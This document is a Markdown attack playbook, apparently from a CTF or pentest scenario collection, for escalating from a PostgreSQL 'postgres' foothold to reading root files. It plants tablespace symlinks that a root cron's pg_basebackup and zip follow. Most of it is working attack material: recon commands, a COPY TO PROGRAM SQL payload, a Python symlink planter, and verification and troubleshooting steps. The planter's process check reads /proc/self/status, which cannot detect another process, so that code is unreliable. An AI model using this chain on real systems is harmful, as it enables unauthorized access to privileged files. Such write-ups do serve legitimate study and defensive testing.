# PostgreSQL Tablespace-Symlink + zip-Follows-Symlink Root File Read

## When this applies

- Linux foothold as the `postgres` user (typically via `COPY ... FROM PROGRAM` RCE).
- A root-running cron / scheduled job runs `pg_basebackup` followed by `zip -r <out>.zip <pgdata-dir>` (or any archiver that follows symlinks by default — `tar`, `cp -L`, `rsync`, `7z` without `-snl`).
- Goal: turn the postgres-controlled tablespace directory into an arbitrary file-read primitive that runs as the root cron job.

## The chain

`pg_basebackup` ships a base-backup of the entire PG data directory, including `pg_tblspc/<oid>` symlinks that point at user-defined tablespace locations. **Two key behaviors compose into a primitive:**

1. **pg_basebackup preserves manual `pg_tblspc/` symlinks WITHOUT a corresponding `pg_tablespace` catalog entry** — it doesn't validate against the catalog before copying directory entries; it just walks the filesystem layout. So if you create `pg_tblspc/<random_oid>` → arbitrary path, the symlink lands in the basebackup output unchanged. Standard "tablespace must be empty" / "directory not empty" checks happen at `CREATE TABLESPACE` time, not during `pg_basebackup`.
2. **`zip -r <out>.zip <dir>` follows directory symlinks by default** unless `-y` is passed. If a root cron archives `<basebackup_dir>/pg_tblspc/<oid>/` and that resolves to `/root/`, every file under `/root/` is read AS ROOT and stored in the zip — readable by any user who can read the resulting archive.

The same primitive applies to `tar` (no `--no-dereference`), `cp` (default behavior), `rsync` (default `-L`-equivalent for the `--copy-links` mode), and `7z` (without `-snl`).

## Identification

```bash
# As postgres / via COPY FROM PROGRAM:
ls -la /var/lib/postgresql/<ver>/main/pg_tblspc/
# Empty or sparse → primitive available

# Find the cron / archiver
cat /etc/cron.d/* /etc/crontab 2>/dev/null
crontab -l 2>/dev/null
ls /etc/cron.{daily,hourly,d}/ 2>/dev/null
# pspy + wait one cycle
/tmp/pspy64 -pf -i 1000 &
# Look for: pg_basebackup -D /tmp/pgX ; zip -r /var/backups/archive.zip /tmp/pgX

# Inspect the archiver's flags
which zip tar rsync 7z
ps -ef | grep -E "zip|tar|rsync"  # during the cron tick
```

If you can read the resulting archive (e.g., over an NFS export of `/var/backups/`), and the archiver follows symlinks, the chain is live.

## Exploitation

```sql
-- As postgres via psql / COPY FROM PROGRAM
COPY (SELECT 'x') TO PROGRAM $$
mkdir -p /tmp/myts/root_dir;
ln -sf /root /tmp/myts/root_dir;
ln -sf /tmp/myts /var/lib/postgresql/14/main/pg_tblspc/99999;
$$;
```

The TOCTOU race: `pg_basebackup` opens `pg_tblspc/99999` lazily — by the time it dereferences, the symlink chain must be fully populated (otherwise it gets a stale read or truncates). Use a high-frequency `Python` planter to keep the symlink fresh during the basebackup window only:

```python
# Aggressive planter, runs in postgres-RCE shell
import os, time
TS = "/var/lib/postgresql/14/main/pg_tblspc/99999"
TARGET = "/tmp/myts"

while True:
    if any("pg_basebackup" in line for line in open("/proc/self/status").read().splitlines() + [""]):
        # pg_basebackup is running — make sure symlinks are present
        try: os.unlink(TS)
        except: pass
        os.symlink(TARGET, TS)
        os.makedirs(f"{TARGET}/root_dir.tmp", exist_ok=True)
        try: os.unlink(f"{TARGET}/root_dir")
        except: pass
        os.symlink("/root", f"{TARGET}/root_dir")
    else:
        # Otherwise unlink to avoid breaking PG normal startup
        try: os.unlink(TS)
        except: pass
    time.sleep(0.0005)
```

(Better: detect the cron tick by polling `ps` or by watching `/var/backups/archive-*.zip` mtime.)

When the cron fires `zip -r ...`, the symlinks are followed and `/root/*` lands inside the archive. Read the archive → `unzip` → `pg_tblspc/99999/root_dir/root.txt`.

## Verifying success

- `unzip -l /var/backups/archive-<latest>.zip | grep root` lists files from `/root/`.
- `unzip -p /var/backups/archive-<latest>.zip <path>/root_dir/root.txt` outputs the flag.
- `cat <extracted>/root_dir/root.txt` returns 32 hex chars.

## Common pitfalls

- **`pg_basebackup` ON THE TARGET vs locally**: if the cron runs `pg_basebackup -D /tmp/pgX -h /var/run/postgresql -U replicator`, the basebackup is a NEW directory unrelated to `/var/lib/postgresql/14/main/`. Plant the symlink in the SOURCE pgdata's `pg_tblspc/` so it's copied into `/tmp/pgX/pg_tblspc/`.
- **`zip` modern versions (>= 3.0) with `-y` flag**: stores symlinks as symlinks instead of following — chain breaks. Read the cron script first.
- **PG `pg_tablespace` catalog assertion**: PG itself rejects manual `pg_tblspc/` entries without a catalog row at startup. Plant only during the cron window; remove between ticks.
- **NFS source-port restriction on macOS**: if the archive lives on an NFS export with `secure` enforced, the macOS attacker may need sudo `mount_nfs -o resvport` (Docker/Lima vpnkit NAT-rewrites outbound source ports). See `scenarios/ad/unconstrained-delegation.md` macOS section.
- **`pg_basebackup` excludes `pg_tblspc/<n>` of MISSING/INVALID symlinks** in some 14+ builds — verify with a dry-run that the symlink survives.

## Tools

- `pspy64` (cron / interval discovery)
- `psql` / `COPY FROM PROGRAM` for the planter
- `unzip` / `tar` (read the resulting archive)
- `inotifywait` on `/var/backups/*.zip` (timing window detection)
